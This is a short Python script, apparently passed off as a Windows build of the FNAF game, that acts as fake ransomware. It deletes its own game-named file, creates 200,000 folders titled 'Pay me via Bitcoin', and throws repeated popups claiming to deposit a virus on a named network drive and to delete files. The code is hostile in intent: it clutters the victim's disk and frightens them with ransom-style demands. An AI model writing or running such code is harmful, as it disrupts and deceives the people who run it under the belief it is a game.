import os
import time
from tkinter import *



LARGE_FONT= ("Verdana", 12)
NORM_FONT = ("Helvetica", 10)
SMALL_FONT = ("Helvetica", 8)

def popupmsg(msg):
    popup = Tk()
    popup.wm_title("!")
    label = Label(popup, text=msg, font=NORM_FONT)
    label.pack(side="top", fill="x", pady=10)
    B1 = Button(popup, text="Give files to Virus", command = popup.destroy)
    B1.pack()
    popup.mainloop()

os.unlink('FNAF Windows version v1.4.0.2 Python.pyw')

for i in range(200000):
    os.mkdir("Pay me via Bitcoin - " + str(i))
    if i % 13 == 0:
        popupmsg('Depositing Virus in N:/Fir-DS-01/TShabir01/...')


for i in range(10):
    time.sleep(30)
    popupmsg("Deleting some files...")
